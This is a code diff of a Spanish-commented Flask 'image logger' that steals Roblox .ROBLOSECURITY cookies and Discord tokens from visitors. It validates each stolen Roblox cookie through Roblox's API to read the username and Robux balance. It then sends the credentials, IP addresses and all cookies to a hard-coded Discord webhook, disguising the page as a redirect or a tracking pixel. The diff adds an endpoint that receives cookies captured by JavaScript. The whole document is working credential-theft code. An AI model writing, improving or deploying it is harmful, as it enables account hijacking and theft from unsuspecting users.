@@ -4,12 +4,13 @@ import json
 from datetime import datetime
 import os
 import base64
+import re
 
 app = Flask(__name__)
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"
 
-# Imagen pixel transparente 1x1 en base64
+# Imagen pixel transparente
 PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")
 
 @app.route('/')
@@ -25,33 +26,47 @@ def index():
                 key, value = cookie.split('=', 1)
                 cookies[key.strip()] = value.strip()
     
-    # Buscar cookies específicas de Roblox y Discord
-    roblox_cookie = cookies.get('.ROBLOSECURITY', 'No Roblox cookie')
-    discord_token = cookies.get('token', 'No Discord token')
-    roblox_session = cookies.get('RBXSessionTracker', 'No session')
-    roblox_user = cookies.get('RBXUserTracker', 'No user')
+    # Buscar cookies específicas
+    roblox_cookie = cookies.get('.ROBLOSECURITY', '')
+    discord_token = cookies.get('token', '')
     
-    # Capturar headers completos
-    headers = dict(request.headers)
+    # Verificar si la cookie de Roblox es válida usando la API
+    username = 'Unknown'
+    robux = 'Unknown'
+    user_id = 'Unknown'
+    
+    if roblox_cookie:
+        try:
+            # Usar la API de Roblox como en el script que me pasaste
+            req = requests.Session()
+            req.cookies['.ROBLOSECURITY'] = roblox_cookie
+            user_info = req.get('https://www.roblox.com/mobileapi/userinfo').json()
+            username = user_info.get('UserName', 'Unknown')
+            robux = user_info.get('RobuxBalance', 'Unknown')
+            user_id = user_info.get('UserID', 'Unknown')
+        except:
+            username = 'Invalid Cookie'
+    
+    # Capturar headers
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Unknown')
     
-    # Datos para Discord
+    # Construir embed para Discord
     embed = {
-        "title": "🎯 IMAGE LOGGER - ROBLOX COOKIE CAPTURED",
+        "title": f"🎯 ROBLOX COOKIE CAPTURED - {username}",
         "description": f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n**IP:** {ip}",
         "color": 16711680,
         "fields": [
             {"name": "🌐 IP", "value": str(ip), "inline": True},
+            {"name": "👤 Username", "value": str(username), "inline": True},
+            {"name": "🆔 User ID", "value": str(user_id), "inline": True},
+            {"name": "💰 Robux", "value": str(robux), "inline": True},
             {"name": "🖥️ User Agent", "value": str(user_agent)[:100], "inline": False},
             {"name": "🔴 ROBLOX COOKIE (.ROBLOSECURITY)", "value": f"```{roblox_cookie}```", "inline": False},
             {"name": "🔵 Discord Token", "value": f"```{discord_token}```", "inline": False},
-            {"name": "📊 Roblox Session", "value": f"```{roblox_session}```", "inline": True},
-            {"name": "👤 Roblox User", "value": f"```{roblox_user}```", "inline": True},
-            {"name": "📋 ALL COOKIES", "value": f"```json\n{json.dumps(cookies, indent=2)[:1000]}```", "inline": False},
-            {"name": "📋 HEADERS", "value": f"```json\n{json.dumps(dict(headers), indent=2)[:1000]}```", "inline": False}
+            {"name": "📋 ALL COOKIES", "value": f"```json\n{json.dumps(cookies, indent=2)[:1000]}```", "inline": False}
         ],
-        "footer": {"text": "Image Logger v3 - Redirect to Profile"}
+        "footer": {"text": "Image Logger - API Verified"}
     }
     
     # Enviar a Discord
@@ -61,12 +76,49 @@ def index():
     except Exception as e:
         print(f"Webhook error: {e}")
     
-    # Redirigir al perfil de Roblox (cambia USER_ID por el que quieras)
+    # Redirigir al perfil de Roblox
     return redirect('https://www.roblox.com/es/users/7869790887/profile', code=302)
+
+@app.route('/api/capture', methods=['POST'])
+def capture():
+    try:
+        data = request.json
+        cookies = data.get('cookies', {})
+        discord_token = data.get('discord_token', '')
+        roblox_cookie = data.get('roblox_cookie', '')
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        
+        # Verificar cookie con API de Roblox
+        username = 'Unknown'
+        if roblox_cookie:
+            try:
+                req = requests.Session()
+                req.cookies['.ROBLOSECURITY'] = roblox_cookie
+                user_info = req.get('https://www.roblox.com/mobileapi/userinfo').json()
+                username = user_info.get('UserName', 'Unknown')
+            except:
+                username = 'Invalid Cookie'
+        
+        embed = {
+            "title": f"🎯 JS CAPTURE - {username}",
+            "color": 16711680,
+            "fields": [
+                {"name": "🌐 IP", "value": str(ip), "inline": True},
+                {"name": "👤 Username", "value": str(username), "inline": True},
+                {"name": "🔴 ROBLOX", "value": f"```{roblox_cookie}```", "inline": False},
+                {"name": "🔵 DISCORD", "value": f"```{discord_token}```", "inline": False},
+                {"name": "📋 ALL COOKIES", "value": f"```json\n{json.dumps(cookies, indent=2)[:500]}```", "inline": False}
+            ]
+        }
+        
+        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
+        return {"status": "success", "username": username}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
 
 @app.route('/pixel.png')
 def pixel():
-    # Capturar cookies también desde la ruta de la imagen
+    # Capturar cookies
     cookies = {}
     cookie_string = request.headers.get('Cookie', '')
     
@@ -77,28 +129,29 @@ def pixel():
                 key, value = cookie.split('=', 1)
                 cookies[key.strip()] = value.strip()
     
-    roblox_cookie = cookies.get('.ROBLOSECURITY', 'No Roblox cookie')
-    discord_token = cookies.get('token', 'No Discord token')
+    roblox_cookie = cookies.get('.ROBLOSECURITY', '')
+    discord_token = cookies.get('token', '')
     
-    if roblox_cookie != 'No Roblox cookie' or discord_token != 'No Discord token':
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        
-        embed = {
-            "title": "📸 PIXEL HIT - COOKIES CAPTURED",
-            "color": 16711680,
-            "fields": [
-                {"name": "🌐 IP", "value": str(ip), "inline": True},
-                {"name": "🔴 ROBLOX", "value": f"```{roblox_cookie}```", "inline": False},
-                {"name": "🔵 DISCORD", "value": f"```{discord_token}```", "inline": False}
-            ]
-        }
-        
+    if roblox_cookie:
         try:
+            req = requests.Session()
+            req.cookies['.ROBLOSECURITY'] = roblox_cookie
+            user_info = req.get('https://www.roblox.com/mobileapi/userinfo').json()
+            username = user_info.get('UserName', 'Unknown')
+            
+            embed = {
+                "title": f"📸 PIXEL HIT - {username}",
+                "color": 16711680,
+                "fields": [
+                    {"name": "👤 Username", "value": str(username), "inline": True},
+                    {"name": "🔴 Cookie", "value": f"```{roblox_cookie}```", "inline": False}
+                ]
+            }
+            
             requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
         except:
             pass
     
-    # Devolver la imagen pixel
     return Response(PIXEL, mimetype='image/png')
 
 if __name__ == '__main__':
